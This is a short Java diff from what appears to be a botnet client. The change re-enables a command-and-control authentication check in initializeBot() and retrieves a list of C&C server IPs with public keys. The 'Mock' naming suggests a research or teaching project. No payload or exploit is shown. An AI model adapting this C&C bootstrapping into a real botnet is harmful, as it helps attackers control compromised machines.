@@ -76,11 +76,11 @@ public class Behavior {
 	public void initializeBot() {
 
 		nServ.firstConnectToMockServerDns();
-		/*
-		 * if (challengeToCommandConquer()) {
-		 * System.out.println("Bot is Ready"); } else
-		 * System.out.println("Bot not Ready, authentication failed");
-		 */
+		
+		 if (challengeToCommandConquer()) {
+		  System.out.println("Bot is Ready"); } else
+		 System.out.println("Bot not Ready, authentication failed");
+		 
 		String data = nServ.getIdHash();
 
 		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
